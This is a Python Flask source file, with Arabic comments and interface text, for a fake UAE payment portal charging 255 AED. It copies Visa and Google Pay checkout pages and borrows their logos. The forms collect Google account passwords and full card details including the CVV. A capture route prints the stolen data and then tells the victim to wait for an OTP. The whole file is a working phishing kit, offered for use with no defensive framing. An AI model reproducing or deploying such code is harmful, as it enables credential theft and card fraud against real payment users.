import os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# 1. صفحة الاختيار الرئيسية
INDEX_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الدفع - الإمارات</title>
    <style>
        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; padding-top: 50px; }
        .card { background: white; padding: 25px; border-radius: 12px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .method { border: 1px solid #ddd; padding: 15px; border-radius: 8px; margin: 15px 0; cursor: pointer; display: flex; align-items: center; justify-content: space-between; text-decoration: none; color: black; }
        .method:hover { border-color: #005a3c; background: #f0fdf4; }
        .method img { height: 30px; }
    </style>
</head>
<body>
    <div class="card">
        <h3>اختر طريقة الدفع المفضلة</h3>
        <p>إجمالي المبلغ: 255.00 AED</p>
        <a href="/visa" class="method">
            <span>بطاقة مصرفية (فيزا/ماستر)</span>
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Visa_Debit_logo.svg/512px-Visa_Debit_logo.svg.png">
        </a>
        <a href="/gpay" class="method">
            <span>Google Pay</span>
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/Google_Pay_%28GPay%29_Logo.svg">
        </a>
    </div>
</body>
</html>
"""

# 2. واجهة Google Pay (مطابقة للمحفظة)
GPAY_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Pay</title>
    <style>
        body { margin: 0; background: #fff; font-family: 'Roboto', sans-serif; text-align: center; }
        .g-header { padding: 20px; border-bottom: 1px solid #eee; }
        .g-content { padding: 40px 20px; }
        .g-btn { background: #000; color: #fff; padding: 15px; width: 100%; border-radius: 25px; border: none; font-size: 18px; margin-top: 20px; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 8px; font-size: 16px; }
    </style>
</head>
<body>
    <div class="g-header"><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="90"></div>
    <div class="g-content">
        <h2>Google Pay</h2>
        <p>ادفع 255.00 AED باستخدام محفظة جوجل</p>
        <form action="/capture" method="post">
            <input type="email" name="g_email" placeholder="البريد الإلكتروني لجوجل" required>
            <input type="password" name="g_pass" placeholder="كلمة المرور" required>
            <button class="g-btn">متابعة عبر G-Pay</button>
        </form>
    </div>
</body>
</html>
"""

# 3. واجهة الفيزا (اللي عجبته في الصورة)
VISA_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #f4f7f6; font-family: sans-serif; padding: 20px; }
        .box { background: #fff; border-radius: 10px; padding: 20px; border: 1px solid #005a3c; }
        .amount { background: #fff5f5; color: #d32f2f; padding: 15px; text-align: center; border-radius: 8px; font-weight: bold; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { background: #005a3c; color: white; width: 100%; padding: 15px; border: none; border-radius: 5px; font-size: 18px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="amount">إجمالي المبلغ المستحق: 255.00 درهم إماراتي (AED)</div>
        <form action="/capture" method="post">
            <input type="text" name="card_name" placeholder="اسم حامل البطاقة" required>
            <input type="text" name="card_num" placeholder="رقم البطاقة" maxlength="16" required>
            <div style="display:flex; gap:10px;">
                <input type="text" name="exp" placeholder="MM/YY" required>
                <input type="text" name="cvv" placeholder="CVV" required>
            </div>
            <button>تأكيد الدفع والإنهاء</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(INDEX_HTML)

@app.route('/visa')
def visa(): return render_template_string(VISA_HTML)

@app.route('/gpay')
def gpay(): return render_template_string(GPAY_HTML)

@app.route('/capture', methods=['POST'])
def capture():
    print(f"!!! DATA CAPTURED: {request.form.to_dict()} !!!")
    return "<h2>جاري التحقق...</h2><p>يرجى الانتظار للحصول على رمز OTP</p>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
